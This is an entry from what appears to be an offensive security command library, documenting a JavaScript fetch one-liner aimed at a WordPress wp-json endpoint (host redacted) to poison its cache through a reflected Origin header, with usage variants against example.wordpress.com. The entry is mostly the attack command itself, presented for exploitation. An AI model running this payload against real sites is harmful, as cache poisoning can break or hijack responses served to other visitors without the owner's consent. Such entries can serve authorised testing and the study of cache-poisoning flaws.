---
id: 7bd372ba-2cd5-45bd-8fe5-12102821a717
name: fetch-wp-json-poison
type: command
executor: javascript
data: >-
  fetch('https://██████████.com/wp-json/?dontreallypoison1').then(res =>
  res.json()).then(json => console.log(json))
output: null
created_at: '2025-12-11T06:10:15.350Z'
updated_at: '2025-12-11T06:10:15.350Z'
platforms:
  - Web
tags:
  - cors
  - cache-poisoning
verified: false
validated: true
submitted: true
---

# fetch-wp-json-poison

## Command

```javascript
fetch('https://██████████.com/wp-json/?dontreallypoison1').then(res => res.json()).then(json => console.log(json))
```

## Description

Sends a cross-origin fetch request to the WP-JSON endpoint with a cache-busting query string, poisoning the cache with the current origin and logging the JSON response. Used to demonstrate and exploit cache poisoning by echoing the Origin in the response header.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `url` | https://██████████.com/wp-json/?dontreallypoison1 - Targets the WP-JSON API with a cache-busting query string | Yes |
| `then(res => res.json())` | Parses the response as JSON | Yes |
| `then(json => console.log(json))` | Logs the parsed JSON to the console | Yes |

## Examples

### Basic Usage

```javascript
fetch('https://example.wordpress.com/wp-json/?cachebust=1').then(res => res.json()).then(json => console.log(json))
```

### Advanced Usage

```javascript
fetch('https://example.wordpress.com/wp-json/?cachebust=2', {method: 'GET'}).then(res => res.json()).then(json => console.log(json))
```

## Expected Output

JSON response from WP-JSON API or a CORS error if the cache is poisoned and origins mismatch.

## Related

- [[procedures/WP-JSON-Cache-Poisoning-Procedure]]
